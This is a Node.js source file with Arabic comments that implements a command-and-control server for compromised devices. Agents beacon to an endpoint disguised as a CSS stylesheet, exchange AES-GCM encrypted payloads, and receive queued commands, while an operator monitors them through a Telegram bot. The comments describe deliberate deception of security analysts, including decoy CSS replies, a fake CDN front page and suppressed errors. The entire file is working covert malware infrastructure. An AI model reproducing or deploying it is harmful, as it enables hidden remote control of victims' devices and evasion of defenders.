// app.js - إطار الإدارة السيادي الحصين (نسخة الاستقرار الأقصى 2026) ☠️🔥
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const zlib = require('zlib'); 

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const MASTER_SECRET = process.env.AGENT_SECRET || 'BaseSystemZeroDaySecureKey2026';

if (!token || !chatId) {
    process.exit(1);
}

const app = express();
// تفعيل خاصية كتم أخطاء البوت الافتراضية لضمان عدم توقف الخدمة أثناء تقلبات الشبكة
const appBot = new telegramBot(token, { polling: true });

const activeNodes = new Map();
const commandQueues = new Map();

// حماية الذاكرة: وضع حد أقصى لحجم الحزم الواردة لتفادي هجمات إغراق خادم العقدة
app.use(express.text({ type: '*/*', limit: '10mb' }));

// اشتقاق مفتاح التشفير المتطابق بنيوياً
const secretBuffer = Buffer.from(MASTER_SECRET, 'utf8');
const CRYPTO_KEY = Buffer.alloc(32);
secretBuffer.copy(CRYPTO_KEY, 0, 0, Math.min(secretBuffer.length, 32));

// --- محرك معالجة وفك التشفير الحصين ---
function processIncomingPayload(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        
        const iv = Buffer.from(packet.v, 'hex');
        const authTag = Buffer.from(packet.g, 'hex');
        const encryptedData = Buffer.from(packet.d, 'hex');

        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, iv);
        decipher.setAuthTag(authTag);
        
        let decryptedBuffer = decipher.update(encryptedData);
        decryptedBuffer = Buffer.concat([decryptedBuffer, decipher.final()]);

        const decompressedData = zlib.gunzipSync(decryptedBuffer).toString('utf8');
        return JSON.parse(decompressedData);
    } catch (e) {
        return null; // كتم الخطأ لحماية بنية الخادم
    }
}

// --- محرك التشفير العكسي الموجه للعميل ---
function encryptOutgoingPayload(plainText) {
    try {
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', CRYPTO_KEY, iv);
        let encrypted = cipher.update(plainText, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag().toString('hex');
        
        return Buffer.from(JSON.stringify({
            v: iv.toString('hex'),
            g: authTag,
            d: encrypted
        })).toString('base64');
    } catch (e) {
        return '';
    }
}

// --- مسار التمويه الشبكي المؤمن عسكرياً ---
app.post('/assets/web/style-min.css', async (req, res) => {
    try {
        const agentModel = req.headers['x-agent-model'] || 'Secure-Node';
        const agentId = req.headers['x-agent-id'] || 'GhostTarget';

        // تعمية: التحقق من وجود المعرفات الأساسية قبل استهلاك معالج التشفير
        if (!req.body || req.body.length < 10) {
            return res.status(404).send('/* Not Found */'); 
        }

        const payload = processIncomingPayload(req.body);
        if (!payload) {
            // تضليل: إذا فشل فك التشفير (محاولة فحص خارجي)، يعيد الخادم شفرة CSS وهمية لخداع المهاجم
            return res.status(200).send('body { margin: 0; padding: 0; }');
        }

        // تحديث طابع النبضة في الذاكرة الحية
        activeNodes.set(agentId, { model: agentModel, lastSeen: Date.now() });

        // فحص الأوامر المعلقة
        let responsePayload = '/* Synchronized */';
        if (commandQueues.has(agentId) && commandQueues.get(agentId).length > 0) {
            const nextCmd = commandQueues.get(agentId).shift();
            const cmdText = JSON.stringify({ directive: nextCmd });
            responsePayload = encryptOutgoingPayload(cmdText);
        }

        // صياغة تقرير الحزمة الآمنة
        let alertMsg = `🔐 <b>إشارة مشفرة مستقرة من العقدة:</b> <code>${agentModel}</code>\n`;
        alertMsg += `📊 الحالة: <code>${payload.status || 'ONLINE'}</code>\n\n`;
        
        await appBot.sendMessage(chatId, alertMsg, { parse_mode: 'HTML' });
        res.status(200).send(responsePayload);

    } catch (err) {
        res.status(200).send('/* CDN Refresh */');
    }
});

// --- لوحة التحكم القيادية ---
const mainKeyboard = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [['🛸 العقد النشطة']],
        resize_keyboard: true
    }
};

appBot.on('message', async (msg) => {
    const text = msg.text;
    if (String(msg.chat.id) !== String(chatId)) return;

    if (text === '/start' || text === 'تفعيل') {
        await appBot.sendMessage(chatId, '🛸 <b>تم تفعيل النواة السيادية بنجاح.</b>\nالمنظومة في وضع الاستماع الصامت حالياً...', mainKeyboard);
    } 
    else if (text === '🛸 العقد النشطة') {
        if (activeNodes.size === 0) {
            await appBot.sendMessage(chatId, '📭 لا توجد اتصالات نشطة في جدول الذاكرة حالياً.', mainKeyboard);
        } else {
            let report = '💀 <b>الأنودات الحية المربوطة بنفق التشفير:</b>\n\n';
            activeNodes.forEach((node, id) => {
                const diff = Date.now() - node.lastSeen;
                const status = (diff < 45000) ? '🟢 ACTIVE' : '⚫ DISCONNECTED';
                report += `📱 الجهاز: <b>${node.model}</b>\n🆔 المعرف: <code>${id}</code>\n📊 الحالة: ${status}\n\n`;
            });
            await appBot.sendMessage(chatId, report, mainKeyboard);
        }
    }
});

// تضليل المحللين: أي محاولة دخول للمسار الرئيسي تعرض صفحة وهمية تشير إلى أن الخدمة تعمل كخادم تنسيق فقط
app.get('/', (req, res) => res.status(200).send('▲ Asset Delivery Network: Core Active'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Sovereign Core Live on Port ${PORT}`);
});
